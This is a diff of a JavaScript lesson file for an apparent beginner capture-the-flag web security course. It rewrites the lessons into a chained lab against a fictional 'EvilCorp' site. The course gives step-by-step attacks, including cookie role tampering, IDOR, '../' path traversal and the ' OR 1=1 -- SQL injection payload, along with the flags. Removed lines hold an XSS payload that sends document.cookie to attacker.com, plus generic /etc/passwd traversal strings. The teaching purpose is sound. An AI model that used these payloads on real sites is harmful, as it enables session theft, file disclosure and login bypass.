@@ -690,217 +690,203 @@ export const TEXTBOOK = {
   },
 
   // ===================================================================
-  //  4. WEB SECURITY (DISSECTING SYSTEMIC FLAWS)
+  //  4. WEB SECURITY (OPERATION GLASSHOUSE)
   // ===================================================================
   'Web Sec': {
     1: {
-      topic: 'HTTP Verbs, Headers & Status Codes (Warm-Up 1)',
-      whatIsIt: 'The World Wide Web runs on HTTP (Hypertext Transfer Protocol). When your browser talks to a server, it sends an HTTP Method (verb) telling the server what action to perform: GET (fetch data), POST (submit form/login), PUT (overwrite file), DELETE (erase data), and OPTIONS (ask what methods are permitted). Servers also inspect HTTP headers (User-Agent, Authorization, Content-Type) before deciding how to respond.',
-      beginnerAnalogy: 'Think of visiting a government office. When you walk up to a service window, you must declare what you want: "I want to inspect my file" (GET), "I am submitting an application" (POST), or "I want to cancel my registration" (DELETE). If the clerk doesn\'t check your ID badge (Header), anyone can demand any service.',
+      topic: 'HTML Source Code & Forgotten Developer Comments (Warm-Up 1)',
+      whatIsIt: 'Every webpage you visit is really just a plain text file written in HTML (HyperText Markup Language). When you open a website, your browser downloads that raw HTML text file and turns it into visual buttons, colors, and boxes. Developers often write notes to themselves inside the code using HTML comment tags (`<!-- note here -->`). Browsers hide these comments on the visual screen, so beginners assume they are secret—but anyone can right-click and click "View Page Source" (or press Ctrl+U) to read every single comment!',
+      beginnerAnalogy: 'Imagine an actor on stage holding a script. The audience only hears the spoken lines, not the stage directions written in the margins. Being able to "View Page Source" is like having a copy of the entire printed script in your lap, including all the secret notes the director scribbled in the margins.',
       realWorldCase: {
-        headline: 'The Misconfigured HTTP DELETE Corporate File Wipes',
-        story: 'In several corporate cloud storage incidents, companies deployed web APIs with default settings where developers forgot to restrict HTTP methods. Attackers discovered that sending an `HTTP DELETE` or `HTTP PUT` request to endpoints like `/api/v1/user/1001` or `/uploads/invoice.pdf` allowed anyone without a password to overwrite or delete customer files because the server only restricted GET requests.',
-        takeaway: 'Security must be enforced across all HTTP verbs, not just the standard GET and POST.'
+        headline: 'The Missouri Governor Press-F12 Incident (2021)',
+        story: 'In October 2021, a reporter in Missouri discovered that the state Department of Elementary and Secondary Education website had embedded the full 9-digit Social Security Numbers of over 100,000 school teachers directly inside the raw HTML source code of a public search page. The numbers were not visible on the normal screen, but pressing Ctrl+U (View Page Source) revealed them in plain text to anyone with a web browser.',
+        takeaway: 'If data is sent to the browser in the HTML source code, it is 100% public—even if it isn\'t rendered on the screen.'
       },
-      whyItMatters: 'Web developers frequently protect only standard GET forms while leaving administrative PUT and POST endpoints unmonitored, allowing attackers to manipulate server state.',
+      whyItMatters: 'Lazy corporate developers frequently leave test passwords, secret API URLs, and debugging notes inside HTML comments assuming regular customers will never look under the hood.',
       stepByStep: [
-        '1. Open Browser Developer Tools (press F12) and switch to the "Network" tab.',
-        '2. Click any button on a website to observe the request method, status codes (200 OK, 403 Forbidden, 404 Not Found, 500 Error).',
-        '3. Inspect the request headers and response headers in the side panel.',
-        '4. Use online API clients like Hoppscotch or cURL to send custom HTTP verbs (POST, PUT, DELETE) to test server responses.'
+        '1. Click [ Open Target Webpage: q1_login.html ] on Question 1.',
+        '2. Right-click anywhere on the webpage background and click "View Page Source" (or press Ctrl+U on Windows / Cmd+Option+U on Mac).',
+        '3. Scroll down to the very bottom of the HTML code.',
+        '4. Read the developer comment inside `<!-- ... -->` to grab `CAT{always_view_the_source}`!'
       ],
       keyTerms: [
-        { term: 'HTTP Verb', meaning: 'The command word (GET, POST, PUT, DELETE, OPTIONS) specifying the desired action.' },
-        { term: 'Status Code', meaning: '3-digit integer issued by a server in response to a client request (e.g. 200, 404, 500).' }
+        { term: 'HTML Source Code', meaning: 'The underlying raw markup text that a browser downloads to render a webpage.' },
+        { term: 'HTML Comment (<!-- -->)', meaning: 'Code annotations ignored by the visual renderer but completely visible in the page source.' }
       ],
       links: [
-        { label: 'MDN Web Docs: HTTP Request Methods', url: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods' }
+        { label: 'MDN Web Docs: HTML Comments', url: 'https://developer.mozilla.org/en-US/docs/Learn/HTML/Introduction_to_HTML/Getting_started#html_comments' }
       ],
       onlineTools: [
-        { name: 'Hoppscotch Online API Client', url: 'https://hoppscotch.io', note: 'Free browser-based API client to craft custom HTTP requests' },
-        { name: 'Browser Developer Tools (F12)', url: 'https://developer.chrome.com', note: 'Inspect real-time HTTP network traffic' }
+        { name: 'Target Webpage: q1_login.html', url: '/websec/q1_login.html', note: 'Right-click -> View Page Source (Ctrl+U)' }
       ],
-      offlineTools: [
-        { name: 'cURL', url: 'https://curl.se', note: 'Command: curl -X POST -H "Content-Type: application/json" https://api...' }
-      ]
+      offlineTools: []
     },
     2: {
-      topic: 'Client-Side DOM & Hidden Form Manipulation (Warm-Up 2)',
-      whatIsIt: 'When you view a website, your browser receives HTML, CSS, and JavaScript and renders the visual layout (the Document Object Model, or DOM). Many novice developers make the fatal mistake of enforcing security rules purely inside the browser using hidden form fields (`<input type="hidden" name="price" value="500">`) or JavaScript disabling logic. Because the code is executing on YOUR computer, you have 100% control over it and can edit any value in seconds using Developer Tools!',
-      beginnerAnalogy: 'Imagine an honor-system self-checkout stand at a grocery store where a sign says "Apples are $5. Please write $5 on this slip." If you take a pen and cross out $5 and write $0.01, and the store clerk accepts the slip without checking their own price list, they trusted client-side input.',
+      topic: 'Crawler Directives & robots.txt Reconnaissance (Warm-Up 2)',
+      whatIsIt: 'Search engines like Google use automated bots ("spiders" or "crawlers") that browse the web 24/7 to index pages. Website owners place a public text file named `robots.txt` at the root of their website (e.g. `example.com/robots.txt`) to tell good search bots which secret folders NOT to index (`Disallow: /secret-admin-folder/`). However, `robots.txt` is not a security lock—it is a public roadmap that tells hackers the exact names of every sensitive folder the company wants to hide!',
+      beginnerAnalogy: 'Imagine putting a huge neon sign on your front lawn that reads: "ATTENTION BURGLARS: Please do NOT look under the third flowerpot on the back porch where I keep my spare house key!" Polite delivery drivers will ignore the flowerpot, but every thief in town will walk straight to it.',
       realWorldCase: {
-        headline: 'The E-Commerce "1 Cent Product" Exploit',
-        story: 'In the early days of online shopping, several major e-commerce platforms allowed users to inspect the checkout page in their browser, edit the hidden form field `<input type="hidden" name="amount" value="999.00">` to `0.01`, and submit the form. The credit card processor happily charged 1 cent, and the automated warehouse shipped the expensive computer equipment because the server never verified the price against its own database!',
-        takeaway: 'Never trust user input; the client is in the hands of the adversary.'
+        headline: 'Healthcare & Government Portal Leaks via robots.txt',
+        story: 'During routine security audits, researchers repeatedly discover corporate and municipal servers that place `Disallow: /backup-sql-dumps/` or `Disallow: /internal-hr-spreadsheets/` inside their `robots.txt` file without putting a password on those folders. Instead of protecting the files, the `robots.txt` entry acts as an instant table of contents for attackers.',
+        takeaway: 'Never rely on robots.txt to hide private files; always enforce real login authentication.'
       },
-      whyItMatters: 'If a web application relies on disabling a button, hiding a field, or checking a password using browser JavaScript, any user can bypass the restriction by pressing F12.',
+      whyItMatters: 'Checking `/robots.txt` is one of the very first things every web security auditor does when inspecting a company\'s website.',
       stepByStep: [
-        '1. Right-click on any locked button or price input on a web page and select "Inspect Element".',
-        '2. In the Elements panel, look for attributes like `disabled`, `readonly`, or `<input type="hidden">`.',
-        '3. Double-click the attribute and delete it, or change the value to your desired string.',
-        '4. Submit the form: observe whether the server blindly accepts the modified client data.'
+        '1. Click [ Open Target File: q2_robots.txt ] on Question 2.',
+        '2. Inspect the `Disallow:` lines that EvilCorp tried to hide from search engines.',
+        '3. Read the compliance note at the bottom of the file to capture `CAT{robots_reveal_secrets}`!'
       ],
       keyTerms: [
-        { term: 'DOM (Document Object Model)', meaning: 'The browser\'s in-memory representation of an HTML document structure.' },
-        { term: 'Client-Side Validation', meaning: 'Checks performed by browser JavaScript before data is sent to the server.' }
+        { term: 'robots.txt', meaning: 'A plain-text file in a website\'s root directory that instructs search engine crawlers which paths not to index.' },
+        { term: 'Security Through Obscurity', meaning: 'The flawed belief that a system is secure simply because its secret URLs or inner workings are hidden from view.' }
+      ],
+      links: [
+        { label: 'Google Search Central: How robots.txt Works', url: 'https://developers.google.com/search/docs/crawling-indexing/robots/intro' }
+      ],
+      onlineTools: [
+        { name: 'Target File: q2_robots.txt', url: '/websec/q2_robots.txt', note: 'Inspect EvilCorp\'s crawler exclusions directly in browser' }
+      ],
+      offlineTools: []
+    },
+    3: {
+      topic: 'Client-Side DOM & Disabled Button Manipulation (Chain Stage 1)',
+      whatIsIt: 'When you view a website, your browser receives HTML, CSS, and JavaScript and renders the visual layout (the Document Object Model, or DOM). Many novice developers make the fatal mistake of enforcing security rules purely inside the browser by adding the word `disabled` to an HTML button (`<button disabled>`). Because that HTML code is running on YOUR computer, you have 100% control over it and can delete the word `disabled` in five seconds using Inspect Element!',
+      beginnerAnalogy: 'Imagine an honor-system self-checkout stand at a grocery store where a paper "Closed" sticker is taped over the cash drawer button. Anyone can peel the paper sticker off with their finger and press the button underneath because there is no real physical lock.',
+      realWorldCase: {
+        headline: 'The E-Commerce "1 Cent Product" & Disabled Checkout Exploits',
+        story: 'In multiple web application audits, companies restricted premium features or early-access downloads simply by rendering `<button disabled>Download Report</button>` for non-paying users, without checking the user\'s subscription on the backend server. Users simply opened Chrome DevTools, deleted the `disabled` attribute, and downloaded the paid reports for free!',
+        takeaway: 'Never trust the client browser; any restriction in HTML or CSS can be edited by the user.'
+      },
+      whyItMatters: 'If a web application relies on greying out a button in HTML instead of verifying permissions on the server, any user can bypass the restriction by pressing F12.',
+      stepByStep: [
+        '1. Open `q3_helpdesk.html` using the button on Question 3.',
+        '2. Right-click directly on the greyed-out `[ Export Classified Directory ]` button and select "Inspect" (or press F12).',
+        '3. In the Elements panel, find `<button id="unlock-btn" disabled ...>` and double-click the word `disabled` to delete it, then press Enter.',
+        '4. Click the newly enabled green button to get `CAT{never_trust_the_client}` and the cookie role clue (`admin`) for Question 4!'
+      ],
+      keyTerms: [
+        { term: 'DOM (Document Object Model)', meaning: 'The browser\'s live, editable in-memory representation of a webpage\'s HTML elements.' },
+        { term: 'Client-Side Validation', meaning: 'UI restrictions enforced in the user\'s browser rather than on the backend server.' }
       ],
       links: [
         { label: 'OWASP Input Validation Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html' }
       ],
       onlineTools: [
-        { name: 'Browser Developer Tools (F12)', url: 'https://developer.chrome.com', note: 'Right-click any web element -> Inspect' }
+        { name: 'Target Webpage: q3_helpdesk.html', url: '/websec/q3_helpdesk.html', note: 'Right-click the grey button -> Inspect -> delete disabled' }
       ],
       offlineTools: []
     },
-    3: {
-      topic: 'Session Cookies & Privilege Flag Manipulation (Chain Stage 1)',
-      whatIsIt: 'HTTP is a "stateless" protocol—it forgets who you are the moment a web page finishes loading. To keep you logged in, servers issue small text snippets called Cookies stored in your browser. Every time you click a link, your browser automatically hands these cookies back to the server. If a developer stores user permissions inside an unsigned cookie (such as `role=user` or `isAdmin=false`), an attacker can simply edit the cookie to `isAdmin=true` and gain full administrative control!',
+    4: {
+      topic: 'Session Cookies & Privilege Flag Manipulation (Chain Stage 2)',
+      whatIsIt: 'HTTP is a "stateless" protocol—it forgets who you are the moment a web page finishes loading. To keep you logged in, servers issue small text snippets called Cookies stored in your browser. Every time you click a link, your browser automatically hands these cookies back to the server. If a developer stores user permissions inside an unsigned plain-text cookie (such as `evilcorp_role=guest`), an attacker can simply edit the cookie to `evilcorp_role=admin` and gain full administrative control!',
       beginnerAnalogy: 'Imagine entering a private club and being handed a paper wristband that says "Standard Guest" written in pencil. If you take an eraser, write "VIP Club Owner" in pencil, and the security guard lets you into the executive suite without checking their computer, the wristband was insecure.',
       realWorldCase: {
         headline: 'The Yahoo! Cookie Forgery Attack (3 Billion Accounts)',
         story: 'Between 2013 and 2014, state-sponsored hackers compromised Yahoo!\'s proprietary user database and stole their internal cookie-minting code. The attackers used this knowledge to forge authentication cookies for any user without knowing their password, granting them unrestricted access to the emails and private messages of over 3 billion accounts.',
         takeaway: 'Cookies must be cryptographically signed (HMAC) or store random unguessable session IDs tied to server-side tables.'
       },
-      whyItMatters: 'Web applications that trust client-supplied session tokens or cookie flags allow immediate privilege escalation from a low-level user to superuser.',
+      whyItMatters: 'Web applications that trust client-supplied session tokens or cookie flags allow immediate privilege escalation from a low-level guest to administrator.',
       stepByStep: [
-        '1. Press F12 to open Developer Tools and navigate to the "Application" (or "Storage") tab.',
-        '2. Expand the "Cookies" dropdown on the left menu and select the active website URL.',
-        '3. Inspect the stored keys: look for names like `session`, `auth`, `role`, or `isAdmin`.',
-        '4. Double-click the value field, change `isAdmin=false` to `isAdmin=true`, and refresh the page.'
+        '1. Open `q4_dashboard.html` using the button on Question 4.',
+        '2. Notice that your current cookie is `evilcorp_role=guest`.',
+        '3. Using the clue from Question 3 (`admin`), change the cookie value from `guest` to `admin` (either in the Live Cookie Inspector box on the page or in F12 -> Application -> Cookies).',
+        '4. Click `[ Save Cookie & Reload ]` to capture `CAT{cookies_are_not_secure}` and the CEO\'s Employee ID (`1042`) for Question 5!'
       ],
       keyTerms: [
         { term: 'HTTP Cookie', meaning: 'A small piece of data stored on the user\'s computer by the web browser while browsing.' },
-        { term: 'Privilege Escalation', meaning: 'The act of exploiting a bug to gain elevated access to resources normally protected from an application or user.' }
+        { term: 'Privilege Escalation', meaning: 'Exploiting a flaw to gain elevated access (such as admin rights) normally protected from a regular user.' }
       ],
       links: [
         { label: 'MDN Web Docs: Using HTTP Cookies', url: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies' }
       ],
       onlineTools: [
-        { name: 'Browser DevTools (Storage Tab)', url: 'https://developer.chrome.com', note: 'Inspect and modify session cookies live in your browser' }
+        { name: 'Target Webpage: q4_dashboard.html', url: '/websec/q4_dashboard.html', note: 'Change evilcorp_role from guest to admin' }
       ],
-      offlineTools: [
-        { name: 'Burp Suite Community Edition', url: 'https://portswigger.net/burp', note: 'The world\'s leading web application security proxy' }
-      ]
+      offlineTools: []
     },
-    4: {
-      topic: 'Parameter Tampering & Insecure Direct Object References (IDOR) (Chain Stage 2)',
-      whatIsIt: 'Insecure Direct Object References (IDOR) occur when an application uses user-supplied input (like a number in a URL: `/invoices?id=1001`) to access an internal database object directly, without verifying whether the currently logged-in user actually has permission to view that record. If user #1001 can change the URL to `?id=1002` and view someone else\'s private medical record or bank statement, the application has an IDOR vulnerability.',
-      beginnerAnalogy: 'Imagine checking into a hotel where the room keys are just metal tags with numbers stamped on them. If your room is #101, but you can walk over to room #102, tap the door with a tag labeled "102" and it unlocks without the front desk checking your registration, that is IDOR.',
+    5: {
+      topic: 'Parameter Tampering & Insecure Direct Object References (IDOR) (Chain Stage 3)',
+      whatIsIt: 'Insecure Direct Object References (IDOR) occur when an application uses user-supplied input (like a number in a URL: `q5_profile.html?id=1001`) to fetch an internal database record directly, without verifying whether the currently logged-in user actually has permission to view that record. If employee #1001 can change the URL to `?id=1042` and view the CEO\'s confidential dossier, the application has an IDOR vulnerability.',
+      beginnerAnalogy: 'Imagine checking into a gym locker room where the lockers have no padlocks—you just tell the attendant "Give me the bag in locker #1001." If you say "Give me the bag in locker #1042" and the attendant hands you the CEO\'s briefcase without checking whose locker it is, that is IDOR.',
       realWorldCase: {
         headline: 'The First American Financial IDOR Leak (885 Million Records)',
-        story: 'In 2019, insurance giant First American Financial exposed 885 million confidential mortgage documents (including bank statements, tax records, and Social Security numbers). The documents were accessible via a web link ending in a sequential document number (`/document/00001001`). Anyone could change the number by 1 and download another person\'s complete mortgage paperwork without any login required.',
+        story: 'In 2019, insurance giant First American Financial exposed 885 million confidential mortgage documents (including bank statements, tax records, and Social Security numbers). The documents were accessible via a web link ending in a sequential document number (`/document/00001001`). Anyone could change the number in their browser address bar and download another person\'s complete mortgage paperwork without any authorization check.',
         takeaway: 'Never expose internal database IDs without strict server-side access control checks.'
       },
-      whyItMatters: 'IDOR is one of the most common and devastating vulnerabilities on the web today, consistently ranked in the OWASP Top 10 for causing massive corporate data exfiltration.',
+      whyItMatters: 'IDOR (Broken Access Control) is currently ranked #1 on the OWASP Top 10 list of most critical web application security risks.',
       stepByStep: [
-        '1. Inspect web page URLs and API network traffic for parameters like `id=`, `user_id=`, or `doc_id=`.',
-        '2. Log into Account A and view a private resource (e.g. `profile?id=50`).',
-        '3. Change the number in the browser URL bar to `id=51` or `id=1`.',
-        '4. Observe if the server renders another user\'s private profile or administrative settings.'
+        '1. Open `q5_profile.html?id=1001` using the button on Question 5.',
+        '2. Notice that `?id=1001` shows a junior intern\'s profile.',
+        '3. Replace `1001` with the CEO Employee ID you discovered in Question 4 (`1042`) in the URL bar or page input and click `[ Load Record ]`.',
+        '4. Copy the flag `CAT{idor_exposes_everyone}` and the secret file path (`../../etc/evilcorp_shadow.conf`) for Question 6!'
       ],
       keyTerms: [
-        { term: 'IDOR', meaning: 'Insecure Direct Object Reference — accessing internal objects via user-controlled input without authorization.' },
-        { term: 'Access Control', meaning: 'The security process determining whether a user has permission to access a specific resource.' }
+        { term: 'IDOR', meaning: 'Insecure Direct Object Reference — accessing another user\'s private records simply by changing an ID number in the URL.' },
+        { term: 'Broken Access Control', meaning: 'When a server fails to verify that the user requesting a record is actually authorized to view it.' }
       ],
       links: [
         { label: 'PortSwigger Web Security Academy: IDOR Guide', url: 'https://portswigger.net/web-security/access-control/idor' }
       ],
       onlineTools: [
-        { name: 'Browser URL Navigation', url: 'https://developer.chrome.com', note: 'Manually test query parameter tampering in the address bar' }
+        { name: 'Target Webpage: q5_profile.html?id=1001', url: '/websec/q5_profile.html?id=1001', note: 'Change id=1001 to id=1042' }
       ],
-      offlineTools: [
-        { name: 'Postman / Burp Suite', url: 'https://postman.com', note: 'Automate sequential ID parameter enumeration' }
-      ]
+      offlineTools: []
     },
-    5: {
-      topic: 'Directory Path Traversal & Arbitrary File Disclosure (Chain Stage 3)',
-      whatIsIt: 'When a web application lets users download files or view images using a filename parameter (such as `/view?file=report.pdf`), it takes the user\'s input and glues it to a folder path on the server. If the application does not validate the input, an attacker can insert relative dot-dot-slash (`../`) directory traversal characters to break out of the website folder and read sensitive operating system files (like `/etc/passwd` on Linux or `C:\\Windows\\win.ini` on Windows).',
-      beginnerAnalogy: 'Imagine being in a library reading room where a librarian asks: "What book from this room would you like?" If you say "Go out the door, turn left, walk down the hall to the manager\'s private safe, and bring me the employee salary ledger" (`../../safe/salaries.txt`), and the librarian blindly obeys, that is Directory Traversal.',
+    6: {
+      topic: 'Directory Path Traversal & Arbitrary File Disclosure (Chain Stage 4)',
+      whatIsIt: 'When a web application lets users view documents using a filename parameter in the URL (such as `q6_files.html?file=welcome.txt`), it takes that filename and looks it up inside a public folder on the server. If the developer forgets to block `../` ("go up one folder level"), an attacker can chain multiple `../../` sequences to climb out of the public web folder and read top-secret server configuration files!',
+      beginnerAnalogy: 'Imagine being in a public museum gift shop where a clerk fetches postcards from a shelf behind the counter. If you ask the clerk: "Go out the back door, walk up two flights of stairs into the director\'s private office, and bring me the ledger on the desk" (`../../etc/evilcorp_shadow.conf`), and the clerk blindly obeys, that is Path Traversal.',
       realWorldCase: {
-        headline: 'The Cisco & Fortinet VPN Path Traversal Exploits',
-        story: 'In 2019 and 2020, critical path traversal vulnerabilities in enterprise VPN software allowed unauthenticated attackers to send requests like `/remote/fgt_lang?lang=../../../../../../dev/cmdb/sslvpn_websession`. This tricked the corporate firewall into dumping plaintext VPN session tokens and passwords of all connected remote employees, leading to massive ransomware outbreaks across hospitals and universities.',
-        takeaway: 'Never concatenate user input directly into operating system file paths.'
+        headline: 'The Apache HTTP Server 2.4.49 Path Traversal Zero-Day (CVE-2021-41773)',
+        story: 'In October 2021, a critical path traversal flaw was discovered in Apache HTTP Server, which powers millions of websites worldwide. Attackers could send URLs containing `../` sequences to break out of the web root directory and read arbitrary sensitive files (including `/etc/passwd` and source code scripts) across thousands of unpatched corporate servers.',
+        takeaway: 'Never pass raw user-supplied filenames directly to operating system file-reading functions.'
       },
-      whyItMatters: 'Directory traversal allows an attacker to steal database credentials, application source code, and cryptographic private keys directly from the underlying host server.',
+      whyItMatters: 'Directory traversal lets attackers steal database configuration files, admin usernames, and private keys straight off the server\'s hard drive.',
       stepByStep: [
-        '1. Look for URL query parameters that take file names: `?page=`, `?file=`, `?document=`.',
-        '2. Replace the filename with dot-dot-slash sequences: `../../../../etc/passwd` or `..\\..\\Windows\\System32\\drivers\\etc\\hosts`.',
-        '3. Send the request and check the HTTP response body for server operating system files.'
+        '1. Open `q6_files.html?file=welcome.txt` using the button on Question 6.',
+        '2. Take the secret configuration path discovered in Question 5: `../../etc/evilcorp_shadow.conf`.',
+        '3. Replace `welcome.txt` with `../../etc/evilcorp_shadow.conf` and click `[ Read File ]`.',
+        '4. Capture `CAT{dot_dot_slash_escape}` and note the database admin username (`director_vance`) for Question 7!'
       ],
       keyTerms: [
-        { term: 'Path Traversal', meaning: 'Exploiting insufficient security validation to access directories and files stored outside the web root.' },
-        { term: 'Dot-Dot-Slash (../)', meaning: 'Operating system syntax used in file systems to navigate up one level in the folder hierarchy.' }
+        { term: 'Path Traversal', meaning: 'Using ../ sequences to escape the intended web directory and access restricted files on the server.' },
+        { term: 'Dot-Dot-Slash (../)', meaning: 'Universal file-system shorthand meaning "move up one parent directory."' }
       ],
       links: [
         { label: 'PortSwigger Web Security Academy: Directory Traversal', url: 'https://portswigger.net/web-security/file-path-traversal' }
       ],
       onlineTools: [
-        { name: 'PortSwigger Web Security Labs', url: 'https://portswigger.net', note: 'Interactive training labs for directory traversal' }
+        { name: 'Target Webpage: q6_files.html', url: '/websec/q6_files.html?file=welcome.txt', note: 'Enter ../../etc/evilcorp_shadow.conf' }
       ],
-      offlineTools: [
-        { name: 'ffuf', url: 'https://github.com/ffuf/ffuf', note: 'Fast web fuzzer to automate directory traversal wordlists' }
-      ]
+      offlineTools: []
     },
-    6: {
-      topic: 'SQL Injection (SQLi) Authentication Bypass (Chain Stage 4)',
-      whatIsIt: 'Relational databases use SQL (Structured Query Language) to store usernames, passwords, and records. When a web login form verifies your credentials, it generates a query like: `SELECT * FROM users WHERE username = \'$user\' AND password = \'$pass\'`. If the developer glues user input directly into the query string without sanitization, an attacker can input special SQL characters like `\' OR 1=1--`. The single quote closes the string, and `OR 1=1` is a mathematical statement that is ALWAYS TRUE! The database returns the administrator account without ever checking a password!',
-      beginnerAnalogy: 'Imagine a bouncer at a club who checks your name on a guest list with a magic rule: "Let them in if their name is on the list, OR if 1 equals 1." If someone walks up and says: "My name is John, OR 1 equals 1," the bouncer says: "Well, 1 DOES equal 1, so come right in!" That is SQL Injection.',
+    7: {
+      topic: 'SQL Injection (SQLi) Authentication Bypass (Chain Stage 5)',
+      whatIsIt: 'Websites use SQL (Structured Query Language) databases to check your username and password when you log in: `SELECT * FROM users WHERE username = \'director_vance\' AND password = \'INPUT\'`. If the developer glues your password input directly into that SQL command without sanitizing quotes, typing `\' OR 1=1 --` breaks the command structure! The single quote `\'` closes the password text early, `OR 1=1` is a math fact that is ALWAYS TRUE, and `--` tells the database to ignore the rest of the line. The database evaluates the query as TRUE and logs you straight in without knowing the password!',
+      beginnerAnalogy: 'Imagine a robotic security guard programmed to ask for your password. If you say: "My password is... [END OF PASSWORD] OR 1 equals 1, ignore everything else!", the robot checks whether 1 equals 1, sees that it is true, and opens the bank vault door.',
       realWorldCase: {
-        headline: 'The TalkTalk Breach & The Teenage SQLi Attack (2015)',
-        story: 'In 2015, British telecommunications giant TalkTalk was breached, exposing personal details, bank account numbers, and sort codes of 157,000 customers. The attack was launched by a 17-year-old using basic automated SQL injection tools on an outdated company webpage. TalkTalk was hit with a record £400,000 fine and lost over 100,000 subscribers, demonstrating how an elementary SQLi flaw can cripple a multibillion-pound corporation.',
-        takeaway: 'Always use Parameterized Queries (Prepared Statements); never concatenate raw SQL strings.'
+        headline: 'The TalkTalk Telecom Breach — How a Simple SQLi Cost £77 Million',
+        story: 'In 2015, British telecom giant TalkTalk suffered a massive data breach exposing the personal and banking details of 157,000 customers. Investigators shocked the industry when they revealed the hack did not use futuristic spyware—it was carried out by teenagers exploiting a classic SQL Injection flaw on an outdated webpage. The breach cost TalkTalk over £77 million and a record regulatory fine.',
+        takeaway: 'Always use Parameterized Queries (Prepared Statements) so user input is never interpreted as SQL commands.'
       },
-      whyItMatters: 'SQL Injection has been one of the most destructive vulnerabilities in web history, consistently responsible for catastrophic corporate database dumps.',
+      whyItMatters: 'SQL Injection is one of the most famous and devastating vulnerabilities in computing history, capable of bypassing any login screen that concatenates raw strings.',
       stepByStep: [
-        '1. Locate a login form or search input on a web application.',
-        '2. Enter a single quote (`\'`) to test if the database crashes or returns a SQL syntax error.',
-        '3. In the username field, input the classic authentication bypass payload: `admin\' OR 1=1--` or `\' OR \'1\'=\'1`.',
-        '4. Enter any random password and submit: observe if you are instantly logged in as the primary administrator!'
+        '1. Open `q7_vault.html` using the button on Question 7.',
+        '2. In the Username box, type the admin username discovered in Question 6: `director_vance`.',
+        '3. In the Password box, type the SQL Injection payload: `\' OR 1=1 --` (watching the Live Backend SQL Query Monitor highlight how the query changes!).',
+        '4. Click `[ Execute SQL Query & Unlock Master Vault ]` to capture the final flag: `CAT{sqli_shatters_evilcorp}`!'
       ],
       keyTerms: [
-        { term: 'SQL Injection (SQLi)', meaning: 'A code injection technique that exploits vulnerabilities in an application\'s software by manipulating database queries.' },
-        { term: 'Prepared Statement', meaning: 'A feature used to execute the same SQL statements repeatedly with high efficiency and complete immunity to SQL injection.' }
+        { term: 'SQL Injection (SQLi)', meaning: 'Injecting special SQL characters (like single quotes) into an input box to alter the backend database query logic.' },
+        { term: 'Prepared Statements', meaning: 'The secure way to write database queries where user input is kept strictly separate from SQL commands.' }
       ],
       links: [
         { label: 'PortSwigger Web Security Academy: SQL Injection', url: 'https://portswigger.net/web-security/sql-injection' }
       ],
       onlineTools: [
-        { name: 'PortSwigger SQLi Playground', url: 'https://portswigger.net', note: 'Interactive real-world SQL injection practice environments' }
+        { name: 'Target Webpage: q7_vault.html', url: '/websec/q7_vault.html', note: 'Username: director_vance | Password: \' OR 1=1 --' }
       ],
-      offlineTools: [
-        { name: 'sqlmap', url: 'https://sqlmap.org', note: 'Automated tool to detect and exploit SQL injection vulnerabilities' }
-      ]
-    },
-    7: {
-      topic: 'Cross-Site Scripting (XSS) & Session Hijacking (Chain Stage 5)',
-      whatIsIt: 'Cross-Site Scripting (XSS) occurs when an application receives user input (such as a search query, forum comment, or profile name) and echoes it directly into the HTML web page without sanitizing or escaping it. An attacker can submit malicious JavaScript code (such as `<script>fetch("http://attacker.com/steal?c=" + document.cookie)</script>`). When another user or administrator visits the page, their web browser executes the attacker\'s JavaScript, sending their private session cookies directly to the attacker!',
-      beginnerAnalogy: 'Imagine a public announcement board where anyone can post sticky notes. If someone posts a note that reads: "By order of the principal: Everyone reading this note must immediately hand their wallet to the guy wearing the red hat," and visitors blindly obey because the note is pinned to the official board, that is XSS.',
-      realWorldCase: {
-        headline: 'The Samy MySpace Worm (The Fastest Spreading Virus in History)',
-        story: 'In 2005, a developer named Samy Kamkar exploited a Cross-Site Scripting flaw on MySpace. He placed a small piece of JavaScript in his profile bio that forced anyone viewing his profile to automatically add him as a hero friend and copy the code to their own profile. Within 20 hours, the code infected over 1,000,000 user profiles, crashing MySpace\'s servers and forcing the platform offline.',
-        takeaway: 'User input must always be treated as untrusted data and strictly HTML-encoded before rendering.'
-      },
-      whyItMatters: 'XSS allows attackers to hijack administrative sessions, steal banking cookies, deface public websites, and launch automated browser worm attacks.',
-      stepByStep: [
-        '1. Locate any search bar or user feedback form that displays your input on the resulting screen.',
-        '2. Enter a basic test payload: `<script>alert(1)</script>` or `<img src=x onerror=alert(1)>`.',
-        '3. If an alert box pops up on your screen, the application is vulnerable to XSS!',
-        '4. Replace the alert with code that reads `document.cookie` to understand how session tokens are stolen.'
-      ],
-      keyTerms: [
-        { term: 'XSS (Cross-Site Scripting)', meaning: 'Security vulnerability allowing attackers to inject client-side scripts into web pages viewed by other users.' },
-        { term: 'Session Hijacking', meaning: 'The exploitation of a valid computer session to gain unauthorized access to information or services.' },
-        { term: 'HTML Escaping', meaning: 'Converting special characters like < and > into harmless entity equivalents (&lt; and &gt;).' }
-      ],
-      links: [
-        { label: 'OWASP Cross-Site Scripting (XSS) Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html' }
-      ],
-      onlineTools: [
-        { name: 'PortSwigger XSS Academy', url: 'https://portswigger.net/web-security/cross-site-scripting', note: 'Interactive real-world labs for testing reflected and stored XSS' }
-      ],
-      offlineTools: [
-        { name: 'OWASP ZAP', url: 'https://zaproxy.org', note: 'Free open-source web application security scanner' }
-      ]
+      offlineTools: []
     }
   }
 };
